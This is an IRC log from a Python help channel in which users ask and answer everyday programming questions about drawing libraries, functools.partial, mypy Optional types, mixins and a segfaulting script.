[07:09:39] *** Joins: Cryp71c (~Cryp71c@2600:1700:23d0:aa00:24a2:dfc0:4ec8:f449)
[07:09:40] <ikanobori> robstr: https://bpaste.net/show/46bf7739a28d really quick example of that.
[07:09:41] *** Joins: subho (~subho@fedora/subho)
[07:09:45] *** Joins: anqxyr (~anqxyr@nat4-minsk-pool-46-53-177-92.telecom.by)
[07:09:50] *** Quits: AliGeyik (~Thunderbi@82.222.185.98) (Ping timeout: 245 seconds)
[07:09:50] *** Joins: Mechanismus (~LabMonkey@2602:306:cf62:e270:bcff:3785:c155:d2bd)
[07:09:53] *** Quits: rudrab (~rudrab@14.139.59.140) (Ping timeout: 248 seconds)
[07:09:57] *** Quits: b (~coffee@unaffiliated/ridout) (Ping timeout: 240 seconds)
[07:10:00] *** Joins: tom__ (~tom@p54B0E142.dip0.t-ipconnect.de)
[07:10:18] *** Joins: uttam (~uttam@vpn.bose.res.in)
[07:11:21] *** Quits: Barones (~B@201.22.189.176.dynamic.adsl.gvt.net.br) (Ping timeout: 240 seconds)
[07:11:37] *** Joins: lastmanstanding (~arjoonn@202.191.67.138)
[07:12:04] <robstr> ikanobori: thank you
[07:12:20] <jonascj> What is the easiest way (likely meaning which library) to open a canvas and drawing shapes (triangles, rectangles, circles, filled / not filled)?
[07:12:23] *** Quits: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com) (Ping timeout: 268 seconds)
[07:12:38] *** Joins: Barones (~B@201.22.189.176.dynamic.adsl.gvt.net.br)
[07:12:44] <_habnabit> jonascj, probably pycairo
[07:12:48] *** Quits: Barones (~B@201.22.189.176.dynamic.adsl.gvt.net.br) (Max SendQ exceeded)
[07:13:09] *** Joins: AliGeyik (~Thunderbi@82.222.185.98)
[07:13:31] <foxmask> o/
[07:13:32] <jonascj> _habnabit: thanks, I'll check it out. turtle might do so as well, although there is the whole animation and turtle aspect
[07:13:42] *** Joins: Barones (~B@201.22.189.176.dynamic.adsl.gvt.net.br)
[07:13:42] <wleslie> tkinter is a good choice
[07:13:54] <_habnabit> jonascj, for extremely simple shapes sure
[07:14:10] *** Quits: sunil_bansal (~sunil_ban@123.63.30.29) (Read error: Connection reset by peer)
[07:14:15] *** Quits: danli (~Thunderbi@220.231.36.187) (Quit: danli)
[07:14:45] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[07:14:48] *** Joins: pheonix83 (~pheonix83@82.102.16.91)
[07:15:01] <jonascj> _habnabit: it is just for introductioary programming for students. Seeing a for-loop used to draw 4 squares instead of counting 1-10 might be better I've come to think.
[07:15:01] *** Quits: yesno (~amrqx@unaffiliated/amrqx) (Quit: Leaving)
[07:15:10] *** Quits: judge2020 (~judge2020@unaffiliated/judge2020) (Ping timeout: 260 seconds)
[07:15:18] *** Quits: Avinash (~Avinash@unaffiliated/avinash) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[07:15:25] *** Joins: jjulian (~jjulian@i5DB5037D.pool.tripleplugandplay.com)
[07:15:26] <_habnabit> jonascj, javascript is good for that
[07:16:48] *** Quits: root3d (~root3d@unaffiliated/root3d) (Ping timeout: 256 seconds)
[07:16:58] <jonascj> _habnabit: true, also everyone uses websites, so the browser will feel natural to work with. But then we/they will have to change tool as soon as the browser/web-programming is no longer the objective. I thought I'd give python a shot since it can be used for pretty much everything.
[07:17:01] *** Joins: iAmerikan (~dwshrewt@unaffiliated/iamerikan)
[07:17:04] *** Joins: Haudegen (~quassel@178.115.237.87)
[07:17:45] <jonascj> for the very first introduction, true, they will be quicker off in javascript since it only requires a texteditor and a browser, both included on every computer. Python requires a python installation, not included on for example windows.
[07:17:50] *** Joins: sunil_bansal (~sunil_ban@123.63.30.29)
[07:17:52] <jonascj> but thank you for the suggestion.
[07:17:58] *** Joins: jb1123 (~Thunderbi@2a02:a03f:5230:2400:4db:7475:7a25:44a2)
[07:18:09] *** Joins: hid3 (~arnoldas@78.157.71.116)
[07:18:26] <wleslie> it's really easy to get a canvas with tkinter and start adding things to it.  I use http://infohost.nmt.edu/tcc/help/pubs/tkinter/web/index.html as a reference, though it does not use the python 3 style names
[07:18:30] *** Joins: n13z (qubth@unaffiliated/n13z)
[07:18:39] *** Joins: amz31 (~amz3@fsfe/amz3)
[07:19:29] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 248 seconds)
[07:19:30] *** Joins: judge2020 (~judge2020@unaffiliated/judge2020)
[07:19:32] *** Joins: root3d (~root3d@unaffiliated/root3d)
[07:19:34] <hid3> Greetings everyone. I have a list which contains alpha-numeric words as elements. I need to run a 'for' loop against it but I need only elements which start with letters A to E (case insensetive). Others are not required. Is there any way to get only those without an 'if' statement inside the for loop itself?
[07:19:51] *** Joins: absolutejam (~absolutej@87-102-46-137.static.kc.net.uk)
[07:19:57] *** Quits: alexandre9099 (~alexandre@unaffiliated/alexandre9099) (Ping timeout: 240 seconds)
[07:20:09] <anddam> why cannot I use func= named argument to functools.partial() ?
[07:20:43] *** Joins: melissa666 (~melissa66@2601:603:4e00:69a0:8114:d75:8e1c:a6e3)
[07:20:45] <BeforeClick> hid3: no
[07:20:46] *** Quits: melissa666 (~melissa66@2601:603:4e00:69a0:8114:d75:8e1c:a6e3) (Max SendQ exceeded)
[07:20:48] <wleslie> anddam: it's positional-only.
[07:20:57] *** Joins: antgel (~topdog@141.226.120.30)
[07:21:02] <anddam> from https://docs.python.org/3.6/library/functools.html#functools.partial I expect being able to do    partial(func=print)
[07:21:10] *** Quits: ellyacht (~Android@unaffiliated/ellyacht) (Quit: -a- IRC for Android 2.1.39)
[07:21:10] <anddam> wleslie: then I'm a bit confused
[07:21:11] <jonascj> wleslie: thanks.
[07:21:12] *** Joins: melissa666 (~melissa66@2601:603:4e00:69a0:8114:d75:8e1c:a6e3)
[07:21:21] *** Parts: SWAT (~swat@ubuntu/member/swat) ()
[07:21:28] *** Quits: iAmerikan (~dwshrewt@unaffiliated/iamerikan) (Ping timeout: 256 seconds)
[07:21:43] <anddam> wleslie: PEP570?
[07:21:49] <KirkMcDonald> anddam: Some builtin functions are implemented in C, and don't follow the normal rules for keyword arguments.
[07:22:06] <wleslie> anddam: C implementation.  many functions written in C take no keyword arguments.
[07:22:33] <wleslie> more specifically, their required arguments have no names.
[07:22:56] <anddam> as long as there's a reason I'm fine with it, but shouldn't this be specified in stdlib docs per each function?
[07:23:00] *** Joins: rendar (~rendar@unaffiliated/rendar)
[07:23:13] *** Joins: davr0s (~textual@host86-138-235-28.range86-138.btcentralplus.com)
[07:23:18] <KirkMcDonald> anddam: Though in the case of partial, it may be deliberate: What if 'func=' is a keyword argument you want to apply to the wrapped function?
[07:23:31] <hid3> BeforeClick: then what's the most efficient way to filter out those elements I need?
[07:23:32] <robstr> ikanobori: Now I'm receiven 'TypeError: unhashable type' :P
[07:23:43] <robstr> ikanobori: is there an easy fix too ?
[07:24:04] <anddam> makes sense, but I expected some kind of track of it in parameter list, isn't there   (funct, *, *args) for that?
[07:24:32] <KirkMcDonald> anddam: No, that isn't what that does.
[07:24:41] <wleslie> robstr: when you define __eq__, you also should define __hash__ so that equal values also have the same hash.
[07:24:46] <BeforeClick> iterate over it and do an if with something element[1].upper() in ["A","E"]
[07:24:53] <KirkMcDonald> anddam: You're thinking of the syntax for defining a parameter as keyword-only.
[07:25:21] <KirkMcDonald> anddam: In which case the * on its own is redundant, since there's already an *args parameter.
[07:25:26] <shmoon> What is the general followed number of space per indentation ? 4 or 2 ?
[07:25:37] <KirkMcDonald> anddam: And, as it turns out, it is implemented in Python: https://github.com/python/cpython/blob/3.6/Lib/functools.py#L241
[07:25:45] <wleslie> shmoon: bit.ly/pep8
[07:26:03] *** Quits: tuxiano (~tuxiano@2a02:8070:89d4:aa00:a531:21b4:403f:c0a9) (Remote host closed the connection)
[07:26:12] <KirkMcDonald> anddam: So this behavior is quite deliberate.
[07:26:19] *** Joins: Johnjay (26780a63@gateway/web/freenode/ip.38.120.10.99)
[07:26:28] *** Quits: melissa666 (~melissa66@2601:603:4e00:69a0:8114:d75:8e1c:a6e3) (Quit: Leaving)
[07:26:47] *** Joins: melissa666 (~melissa66@2601:603:4e00:69a0:8114:d75:8e1c:a6e3)
[07:26:56] *** Quits: melissa666 (~melissa66@2601:603:4e00:69a0:8114:d75:8e1c:a6e3) (Max SendQ exceeded)
[07:27:05] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[07:27:20] <anddam> KirkMcDonald: yes, I see it should be  (func, /, *args…)
[07:27:22] *** Joins: melissa666 (~melissa66@2601:603:4e00:69a0:8114:d75:8e1c:a6e3)
[07:27:39] <shmoon> wleslie: Says 4 spaces for indentation
[07:27:46] <wleslie> correct
[07:28:16] *** Joins: s14ve (~s14ve@ip-78-102-32-106.net.upcbroadband.cz)
[07:28:51] *** Quits: wleslie (~verte@python/site-packages/verte) (Quit: ~~~ Crash in JIT!)
[07:28:59] <anddam> nvm, I think I see my own objection was wrong in first place
[07:28:59] *** Quits: s14ve (~s14ve@ip-78-102-32-106.net.upcbroadband.cz) (Client Quit)
[07:29:17] <hid3> thanks, will try to take that approach
[07:29:36] <anddam> functools.partial(func, *args, **keywords)  is asking for a positional non-optional argument and I'm not providing one by only passing keywords, period.
[07:30:04] <anddam> thanks
[07:30:27] *** Quits: Mat001 (~Mat001@c-71-202-209-15.hsd1.ca.comcast.net) (Ping timeout: 240 seconds)
[07:31:50] *** Joins: omarek (~mareko@185.59.108.236.maxnet.net.pl)
[07:32:07] *** Quits: wilbert_ (wilbert@gateway/vpn/privateinternetaccess/wilbert) (Ping timeout: 268 seconds)
[07:32:22] <KirkMcDonald> anddam: Hmm. It would be entirely valid to pass it as a keyword parameter, normally.
[07:32:23] *** Quits: Saukk (~Saukk@91-156-131-210.elisa-laajakaista.fi) (Remote host closed the connection)
[07:32:37] *** Quits: RebelCoder (~RebelCode@82.129.117.5) (Remote host closed the connection)
[07:33:08] <KirkMcDonald> anddam: It's just that this would preclude passing any positional arguments.
[07:33:18] *** Joins: Avinash (~Avinash@unaffiliated/avinash)
[07:33:31] *** Quits: subho (~subho@fedora/subho) (Quit: laptop going to sleep. ZZZzzz…)
[07:33:32] <KirkMcDonald> anddam: E.g. https://bpaste.net/show/a38515f9c609
[07:33:49] *** Joins: zee313_ (~ZeeshanSi@103.255.6.68)
[07:33:51] *** Joins: psachin (~psachin@103.51.234.17)
[07:34:00] <KirkMcDonald> anddam: But it's deliberately written in such a way that it will only accept it as a positional argument.
[07:34:26] *** Quits: Farad41 (~Thunderbi@2604:6000:140a:c009:6c19:5b2:9269:51f2) (Quit: Farad41)
[07:34:35] <KirkMcDonald> anddam: So the complaint that the docs don't mention this detail is probably fair.
[07:34:45] *** Quits: Avinash (~Avinash@unaffiliated/avinash) (Client Quit)
[07:35:10] <zee313_> I have installed anaconda for python. Can I change python 3.6.5 to python 3.7.0
[07:35:48] *** Quits: dodobrain (~dodobrain@unaffiliated/freakabcd) (Quit: buh bye)
[07:36:14] *** Joins: iderik (~idk@h-0-97.A147.priv.bahnhof.se)
[07:36:14] *** Joins: subho (~subho@fedora/subho)
[07:36:32] <KirkMcDonald> zee313_: I don't know a lot about Anaconda, but probably not just like that.
[07:36:37] *** Joins: basen_ (~basen_@62.178.248.26)
[07:36:47] *** Quits: graphene (~graphene@46.101.134.251) (Remote host closed the connection)
[07:36:53] <anddam> PEP 570 mentions that for documentational purpose, built-in docs use a trailing /)
[07:37:00] <anddam> ]Ki^
[07:37:04] <anddam> KirkMcDonald: ^
[07:37:16] *** Joins: Falc (~LaurentDB@193.191.206.243)
[07:37:22] *** Joins: graphene (~graphene@46.101.134.251)
[07:37:35] *** Quits: callMe_Dude (~callMe_Du@117.221.144.188) (Ping timeout: 276 seconds)
[07:38:24] *** Joins: tino097 (~tino097@77.29.181.48)
[07:38:55] <KirkMcDonald> anddam: Could make sense to include that here.
[07:40:40] *** Joins: orekix (~orekix@2001:19f0:7001:1561:5400:1ff:fe88:eb9e)
[07:40:50] *** Joins: Avinash (~Avinash@unaffiliated/avinash)
[07:41:29] *** Joins: purplex88 (~purplex88@unaffiliated/purplex88)
[07:42:48] *** Joins: MrNeon (~quassel@93.102.246.157.rev.optimus.pt)
[07:43:13] <ikanobori> mrm
[07:43:38] <ikanobori> I have some types like `bla: Callable[[Connection], Awaitable[None]] = None`
[07:43:46] <ikanobori> But I think that should be an Optional[...]
[07:43:55] <ikanobori> Since its default value is None?
[07:43:58] *** Quits: lolidunno (~lolidunno@cpe-45-50-100-24.socal.res.rr.com) (Quit: h)
[07:44:15] *** Quits: CrazyEddy (crazyed@wrongplanet/CrazyEddy) (Ping timeout: 256 seconds)
[07:44:24] *** Quits: pheonix83 (~pheonix83@82.102.16.91) (Quit: WeeChat 2.0.1)
[07:44:54] *** Parts: Emperorpenguin (~quassel@107.170.80.143) ("I'm out")
[07:45:19] *** Joins: timtek (~tek@unaffiliated/timtek)
[07:45:38] *** Quits: deng_cn (~Thunderbi@210.21.222.210) (Quit: deng_cn)
[07:46:11] <cdunklau> ikanobori: what, the tvar given to Awaitable?
[07:46:25] <ikanobori> The entire Callable.
[07:46:29] <ikanobori> Since its default value is None.
[07:46:44] <ikanobori> As in Optional[Callable[...]] = None
[07:47:12] <cdunklau> ikanobori: can the Callable itself return None? or does it have to return an Awaitable, of which the resultant defaults to None?
[07:47:30] *** Joins: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au)
[07:47:33] <ikanobori> The latter and you don't have to pass a callable.
[07:47:37] <cdunklau> oh you mean the Callable itself
[07:47:38] <ikanobori> It's some code that can set a callback or not.
[07:47:47] <cdunklau> yeah so Optional[Callable[...]] i would think
[07:48:03] <ikanobori> Yea, I changed it to that too but it was confusing that mypy didn't warn about it.
[07:48:17] <ikanobori> Since annotation plus `= None` seems like an error?
[07:48:25] <cdunklau> but i don't know if it mypy has a concept of a nullable type by default
[07:48:38] <cdunklau> like, say, C# where String is nullable
[07:49:06] <liste> ikanobori: you can configure mypy to treat all types as Optional
[07:49:30] <ikanobori> liste: But that's not the default right? I'm finding some stuff about optional primitives so maybe complex types are by default optional?
[07:49:48] *** Quits: jb1123 (~Thunderbi@2a02:a03f:5230:2400:4db:7475:7a25:44a2) (Ping timeout: 256 seconds)
[07:49:58] *** Quits: masoudd (~masoudd@5.116.23.94) (Remote host closed the connection)
[07:50:10] *** Quits: gvalkov (~gv@unaffiliated/gvalkov) (Ping timeout: 260 seconds)
[07:50:19] *** Joins: masoudd (~masoudd@5.116.23.94)
[07:51:26] *** Joins: loader (~loader@81.19.4.181)
[07:52:08] *** Quits: uttam (~uttam@vpn.bose.res.in) (Quit: uttam)
[07:52:30] *** Quits: Mayurvpatil (~mayurvpat@123.201.35.174) (Ping timeout: 260 seconds)
[07:52:43] *** Quits: _MAXIMUS_ (~MAXIMUS@71.177.158.202) (Read error: Connection reset by peer)
[07:52:55] <liste> ikanobori: strict_optional is True by default, correct
[07:53:11] <liste> BUT: "Note:: This was False by default in mypy versions earlier than 0.600."
[07:53:12] *** Quits: sunil_bansal (~sunil_ban@123.63.30.29) (Read error: Connection reset by peer)
[07:53:18] *** Joins: Venomen (~venomen@unaffiliated/venomen)
[07:53:31] <ikanobori> Can't be that, I'm on 0.610 so I'll ask the mypy dude once he wakes up :)
[07:53:44] *** Joins: sunil_bansal (~sunil_ban@123.63.30.29)
[07:54:17] *** Joins: seen_ (~seen_@gateway/tor-sasl/seen/x-50706747)
[07:56:30] *** Joins: AquaL1te (~AquaL1te@unaffiliated/aqual1te)
[07:57:21] *** Joins: cu_cucambur (~cu_cucamb@45.242.112.53)
[07:57:32] *** Joins: MrNeon_ (~quassel@93.102.246.157.rev.optimus.pt)
[07:59:18] *** Quits: MrNeon (~quassel@93.102.246.157.rev.optimus.pt) (Ping timeout: 256 seconds)
[07:59:57] *** Joins: azuri5 (~azuri5@14.143.147.182)
[08:01:00] *** Joins: rsrx (~rsrx@cable-94-189-226-199.dynamic.sbb.rs)
[08:01:43] *** Quits: lbalhar (~lbalhar@93.185.13.26) (Ping timeout: 268 seconds)
[08:01:47] *** Joins: m8 (~m8@unaffiliated/m8)
[08:02:26] *** Quits: robstr (~rsoeldner@ip1f12f907.dynamic.kabel-deutschland.de) (Read error: Connection reset by peer)
[08:02:33] <zee313_> redolff
[08:02:42] *** Joins: CtrlC (~CtrlC@unaffiliated/ctrlc)
[08:02:57] *** Quits: fr0ddy (~fr0ddy@49.248.66.98) (Ping timeout: 256 seconds)
[08:02:59] *** Quits: MrNeon_ (~quassel@93.102.246.157.rev.optimus.pt) (Ping timeout: 255 seconds)
[08:03:11] *** Joins: MrNeon (~quassel@93.102.246.157.rev.optimus.pt)
[08:03:29] *** Joins: Syzygy__ (~Syzygy@078132089037.public.t-mobile.at)
[08:03:34] *** Joins: [itchyjunk] (~itchyjunk@unaffiliated/itchyjunk/x-1640057)
[08:04:20] *** Quits: subho (~subho@fedora/subho) (Quit: laptop going to sleep. ZZZzzz…)
[08:05:11] <shmoon> Is there an equivalent of PHP's trait or Ruby's modules in Python ?
[08:05:31] <shmoon> traits/modules are basically a wrapper over a bunch of functions that I can include in a class and it becomes a part of the class (instance) methods.
[08:05:48] <shmoon> so then I can do something like class HelloWorld { use SomeTrait; }
[08:06:07] *** Quits: LiftLeft (~loser@2001:19f0:5c01:1cb2:5400:1ff:fe83:8bed) (Ping timeout: 265 seconds)
[08:06:40] *** Joins: rjdp9736 (~rjdp9736@49.205.216.204)
[08:06:42] *** Joins: Mikee_C (~michaelc@cpc82911-enfi22-2-0-cust257.20-2.cable.virginm.net)
[08:07:19] *** Quits: cu_cucambur (~cu_cucamb@45.242.112.53) (Quit: Leaving)
[08:07:58] *** Joins: subho (~subho@fedora/subho)
[08:08:12] <cdunklau> shmoon: no, the closest thing would be a mixin
[08:08:45] <cdunklau> shmoon: but that involves MI, which can be... confusing
[08:09:00] <shmoon> Will look that up, one more way is multiple inheritance but don't like that.
[08:09:10] <cdunklau> shmoon: however, python does have protocols for common things like iteration, item access, et
[08:09:13] <cdunklau> etc*
[08:09:20] <cdunklau> shmoon: what behavior do you want?
[08:09:26] <shmoon> oh seems like mixin = multiple inheritance
[08:09:32] <cdunklau> shmoon: yes
[08:09:50] <cdunklau> shmoon: a mixin is basically just a class with only methods
[08:10:04] <shmoon> yup thats what i want but without class A(B,C,D,E,...)
[08:10:04] *** Joins: Kazzycoyote (~AndChat19@2600:1700:2bb1:d50:cd84:3642:25b7:6408)
[08:10:18] <cdunklau> shmoon: what's the concrete situation?
[08:10:47] *** Joins: volition (volition@gateway/vpn/privateinternetaccess/volition)
[08:11:03] *** Joins: purplex88_ (~purplex88@unaffiliated/purplex88)
[08:11:22] *** Quits: Arcaelyx (~Arcaelyx@2604:2000:f14a:2500:44b7:d903:69b3:3e53) (Quit: Textual IRC Client: www.textualapp.com)
[08:11:33] *** Joins: cyanide (~cyanide@unaffiliated/cyanide)
[08:12:01] *** Joins: hkr (hkr@gateway/vpn/privateinternetaccess/hkr)
[08:12:02] *** Quits: Kazzycoyote (~AndChat19@2600:1700:2bb1:d50:cd84:3642:25b7:6408) (Client Quit)
[08:12:15] *** Joins: VikingHoarder (~VikingHoa@203.233.108.93.rev.vodafone.pt)
[08:12:49] *** Quits: zee313_ (~ZeeshanSi@103.255.6.68) (Read error: Connection reset by peer)
[08:14:05] *** Quits: purplex88 (~purplex88@unaffiliated/purplex88) (Ping timeout: 276 seconds)
[08:14:32] *** Joins: genericanon (~dino@1.123.4.100)
[08:14:43] *** Joins: zee313_ (~ZeeshanSi@103.255.6.68)
[08:14:44] *** Joins: kurkale6ka (~kurkale6k@62.232.85.2)
[08:15:55] <cdunklau> shmoon: because there could be a reasonable way to avoid MI depending on the specifics
[08:16:27] *** Quits: ArkQuintet (~ArkQuinte@200116b8400da1004c06e4fdb5528c6e.dip.versatel-1u1.de) (Ping timeout: 245 seconds)
[08:16:45] *** Joins: kushalAgrawal (uid279683@gateway/web/irccloud.com/x-dwccmftwnnswpbda)
[08:16:55] *** Joins: Edico (~fenrir@unaffiliated/edico)
[08:16:59] *** Quits: zee313_ (~ZeeshanSi@103.255.6.68) (Client Quit)
[08:17:23] *** Joins: Avinash_ (~Avinash@unaffiliated/avinash)
[08:17:27] *** Quits: Avinash (~Avinash@unaffiliated/avinash) (Ping timeout: 240 seconds)
[08:17:50] *** Joins: purplex88__ (~purplex88@unaffiliated/purplex88)
[08:17:50] *** purplex88__ is now known as purplex88
[08:18:21] *** Quits: purplex88_ (~purplex88@unaffiliated/purplex88) (Ping timeout: 264 seconds)
[08:19:20] *** Joins: uttam (~uttam@vpn.bose.res.in)
[08:19:59] *** Quits: uttam (~uttam@vpn.bose.res.in) (Client Quit)
[08:20:08] *** Joins: Zinob (~zinob@stratus.zxz.se)
[08:20:10] *** Quits: antgel (~topdog@141.226.120.30) (Ping timeout: 264 seconds)
[08:20:19] *** Joins: uttam (~uttam@vpn.bose.res.in)
[08:21:44] *** Joins: Darkhunter (~mmojzis@static-84-42-152-237.net.upcbroadband.cz)
[08:22:31] *** Joins: wleslie (~verte@python/site-packages/verte)
[08:22:34] *** Joins: apoc146 (apoc146@2405:205:b087:602c:a4b2:8c17:752e:93c7)
[08:22:54] *** Quits: doubtful (~abhigenie@dyn-160-39-2-144.dyn.columbia.edu) (Quit: Sleeping. ZZZzzz…)
[08:22:55] *** Joins: s14ve (~s14ve@80.188.193.126)
[08:23:06] *** Joins: elichai2 (uid212594@gateway/web/irccloud.com/x-vryyqpptqubjklyo)
[08:23:35] *** Quits: lastmanstanding (~arjoonn@202.191.67.138) (Ping timeout: 240 seconds)
[08:23:56] *** Quits: apoc146 (apoc146@2405:205:b087:602c:a4b2:8c17:752e:93c7) (Quit: Leaving)
[08:24:00] *** Quits: AnySomebody (~AnySomebo@p2003005F2814A396A097A2FFFE5553BE.dip0.t-ipconnect.de) (Ping timeout: 265 seconds)
[08:24:14] <Zinob> I have a quick-n-dirty utility-script at work that crashes after the last line, WTF? https://paste.pound-python.org/show/YXdaIpTVPBlBc6r9aad9/
[08:24:44] *** Joins: jancoow_ (~jancoow@dhcp-077-251-034-091.chello.nl)
[08:24:55] <Zinob> It kept getting seg faults but it seemed to do everythign correctly, so i added a printout at the last line of the main-file. And it crashes after that point. THat is absurd.
[08:25:27] *** Quits: andyhuzhill (~andyhuzhi@14.23.45.178) (Ping timeout: 265 seconds)
[08:25:33] <Zinob> Python 3.5.4  ... also it didnt do this yesterday O_o
[08:25:49] <cdunklau> Zinob: let's see the code
[08:25:54] *** Quits: Avinash_ (~Avinash@unaffiliated/avinash) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[08:26:21] <cdunklau> Zinob: the segfault is likely happening somewhere during cleanup
[08:26:37] *** Joins: ncrocfer (~ncrocfer@unaffiliated/ncrocfer)
[08:26:49] *** Parts: ncrocfer (~ncrocfer@unaffiliated/ncrocfer) ()
[08:27:23] *** Joins: l00t (~l00t@82.119.168.140)
[08:27:38] *** Quits: italic (~italic@unaffiliated/italic/x-8958156) (Ping timeout: 276 seconds)
[08:29:06] *** Quits: s14ve (~s14ve@80.188.193.126) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[08:29:07] *** Joins: stranac (~stranac@78-1-33-209.adsl.net.t-com.hr)
[08:30:21] *** Quits: Syzygy__ (~Syzygy@078132089037.public.t-mobile.at) (Ping timeout: 264 seconds)
[08:30:25] *** Joins: ArkQuintet (~ArkQuinte@200116b84066c1002c347b0fd3bd15df.dip.versatel-1u1.de)
[08:31:16] *** Joins: c-fire (~c-fire@unaffiliated/c-fire)
[08:32:21] *** Joins: Sepultura (~Sepultura@unaffiliated/sepultura)
[08:32:42] *** Quits: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de) (Ping timeout: 265 seconds)
[08:34:17] *** Joins: s14ve (~s14ve@80.188.193.126)
[08:34:23] *** Joins: adamholmberg (~adamholmb@69.80.114.120)
[08:34:47] *** Joins: ncrocfer (~ncrocfer@unaffiliated/ncrocfer)
[08:34:57] *** Joins: kurkale61 (~kurkale6k@84.45.99.125)
[08:35:18] <Zinob> cdunklau: Right, i just have to push it to github first
[08:35:22] *** Parts: ncrocfer (~ncrocfer@unaffiliated/ncrocfer) ()
[08:35:46] *** Joins: dfee4 (~dfee@cpe-70-95-143-62.san.res.rr.com)
[08:36:22] *** Quits: pR0Ps (~pR0Ps@104-222-117-159.cpe.teksavvy.com) (Ping timeout: 264 seconds)
[08:37:06] *** Joins: pR0Ps (~pR0Ps@69-196-139-2.dsl.teksavvy.com)
[08:37:08] *** Joins: plutoniix (~q@175.176.222.7)
[08:37:23] *** Quits: kurkale6ka (~kurkale6k@62.232.85.2) (Ping timeout: 276 seconds)
[08:38:27] *** Joins: waveform (~waveform@waveform.plus.com)
[08:38:51] *** Quits: adamholmberg (~adamholmb@69.80.114.120) (Ping timeout: 240 seconds)
[08:38:54] *** Joins: CrazyEddy (crazyed@wrongplanet/CrazyEddy)
[08:39:20] *** Joins: stitched_unicorn (~textual@fs276ed214.tkyc201.ap.nuro.jp)
[08:39:42] *** Joins: andyhuzhill (~andyhuzhi@14.23.45.178)
[08:39:57] *** Quits: dfee4 (~dfee@cpe-70-95-143-62.san.res.rr.com) (Ping timeout: 240 seconds)
[08:39:58] *** Quits: hkr (hkr@gateway/vpn/privateinternetaccess/hkr) (Ping timeout: 240 seconds)
[08:40:19] <Zinob> cdunklau: https://github.com/zinob/standupdog
[08:40:48] <Zinob> I might have comitted deliberatley broken debug code...
[08:40:55] *** Quits: timtek (~tek@unaffiliated/timtek) (Ping timeout: 256 seconds)
[08:41:49] <cdunklau> Zinob: to master? shame on you :P
[08:42:07] <cdunklau> Zinob: so which is the script
[08:43:35] *** Quits: kjam (~kjam@ahhhhmazing.com) (Ping timeout: 245 seconds)
[08:43:36] *** Quits: stitched_unicorn (~textual@fs276ed214.tkyc201.ap.nuro.jp) (Client Quit)
[08:44:16] *** Quits: sunil_bansal (~sunil_ban@123.63.30.29) (Remote host closed the connection)
[08:44:24] *** Joins: stitched_unicorn (~textual@fs276ed214.tkyc201.ap.nuro.jp)
[08:44:53] *** Joins: sunil_bansal (~sunil_ban@123.63.30.29)
[08:45:38] *** Joins: hkr (~hkr@unaffiliated/hkr)
[08:45:59] *** Quits: masoudd (~masoudd@5.116.23.94) (Quit: May your strings always be '\0' terminated.)
[08:46:36] <Zinob> cdunklau: it was just an internal project that never meant to see the eyes of the public
[08:46:37] *** Joins: kjam (~katharine@ahhhhmazing.com)
[08:46:51] *** Quits: sunil_bansal (~sunil_ban@123.63.30.29) (Remote host closed the connection)
[08:46:54] <cdunklau> Zinob: ...i mean which is the one that segfaults
[08:47:01] <Zinob> cdunklau: The "main" file is  ./present_standup.py
[08:47:19] *** Joins: bigjazzsound1 (~bigjazzso@2604:a880:cad:d0::2fd:9001)
[08:47:40] *** Joins: _ADN_ (~username@5.148.34.186)
[08:47:40] <Zinob> cdunklau: but it only seem to crash if  line 89 (slacklog = slacklogs.get_todays_events(frm).items() ) is run.
[08:48:04] <Zinob> slacklogs.py does not crash when run on its own though.
[08:48:18] *** Joins: fr0ddy (~fr0ddy@49.248.66.98)
[08:49:46] *** Joins: vicenteH (~user@195.235.96.150)
[08:50:08] *** Joins: pro_z (~pro_z@93.84.41.139)
[08:50:42] *** Joins: rudrab (~rudrab@14.139.59.140)
[08:51:24] <cdunklau> Zinob: i dunno what's wrong
[08:51:31] <cdunklau> Zinob: but you are using shelve, and that's bad
[08:51:37] <cdunklau> i doubt it's related though
[08:51:41] *** Quits: genericanon (~dino@1.123.4.100) (Quit: Konversation terminated!)
[08:52:09] *** Quits: jjulian (~jjulian@i5DB5037D.pool.tripleplugandplay.com) (Remote host closed the connection)
[08:52:20] *** Quits: kmey (ilprvc8n0s@going.ninja) (Ping timeout: 276 seconds)
[08:52:26] *** Joins: AnySomebody (~AnySomebo@192.129.2.104)
[08:52:27] *** Joins: fikka (~fikka@31.223.233.9)
[08:52:33] *** Joins: cu_cucambur (~holoirc@45.242.112.53)
[08:52:37] *** Joins: Sylhouette (~johan@62.12.9.66)
[08:52:40] *** Joins: jjulian (~jjulian@i5DB5037D.pool.tripleplugandplay.com)
[08:53:01] *** Joins: kmey (ydpq66cuq8@going.ninja)
[08:53:09] *** Joins: lastmanstanding (~arjoonn@202.191.67.138)
[08:53:19] *** Quits: hkr (~hkr@unaffiliated/hkr) (Quit: WeeChat 2.1)
[08:53:46] *** Quits: cu_cucambur (~holoirc@45.242.112.53) (Remote host closed the connection)
[08:54:01] *** Quits: Darkhunter (~mmojzis@static-84-42-152-237.net.upcbroadband.cz) (Quit: Leaving.)
[08:54:30] *** Joins: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de)
[08:54:34] <Zinob> cdunklau: eh shelve is a bit slow and you should never use it for production work but for my onwn quck-and-dirty-work i have never had it fail
[08:54:57] *** Quits: rudrab (~rudrab@14.139.59.140) (Ping timeout: 248 seconds)
[08:55:04] *** Joins: LiftLeft (~loser@2001:19f0:5c01:1cb2:5400:1ff:fe83:8bed)
[08:55:49] *** Joins: lumm (~lumm@44.204.136.77.rev.sfr.net)
[08:55:52] *** Quits: bigjazzsound1 (~bigjazzso@2604:a880:cad:d0::2fd:9001) (Quit: WeeChat 1.4)
[08:55:59] *** Quits: fr0ddy (~fr0ddy@49.248.66.98) (Remote host closed the connection)
[08:56:05] *** Quits: audioburn (~theology@unaffiliated/not-mike/x-4399907) (Ping timeout: 255 seconds)
[08:56:13] *** Joins: zamba (marius@flage.org)
[08:56:46] *** Joins: bigjazzsound1 (~bigjazzso@2604:a880:cad:d0::2fd:9001)
[08:56:49] *** Joins: minip (~minip@unaffiliated/minip)
